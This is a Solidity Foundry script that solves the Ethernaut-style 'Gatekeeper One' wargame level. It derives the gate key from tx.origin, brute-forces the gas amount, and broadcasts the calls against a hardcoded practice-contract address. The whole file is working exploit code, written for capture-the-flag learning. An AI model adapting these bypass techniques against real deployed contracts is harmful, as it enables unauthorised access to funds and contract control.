// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/13_Gatekeeper_One.sol";

contract Helper {
    GatekeeperOne public target;
    bytes8 public key;

    constructor(GatekeeperOne _target) {
        target = _target;
        uint16 key16 = uint16(uint160(tx.origin));
        uint64 key64 = uint64(key16) + uint64(1 << 63);
        key = bytes8(key64);
    }

    function exploit() external {
        for (uint256 i = 0; i < 8191; i++) {
            (bool res, ) = address(target).call{ gas : 24573 + i }(abi.encodeWithSignature("enter(bytes8)", key));
            if (res) {
                break;
            }
        }
    }
}

contract POC is Script {
    GatekeeperOne public target;

    // function setUp() external {
    //     target = new GatekeeperOne();
    // }

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        target = GatekeeperOne(0x8dC0F2FD7F6c823FefC7D5A49d30C3C81c1B2e3A);
        Helper helper = new Helper(target);
        
        address entrant = target.entrant();
        console.log("before entrant: ", entrant);

        helper.exploit();

        entrant = target.entrant();
        console.log("after  entrant: ", entrant);

        vm.stopBroadcast();
    }
}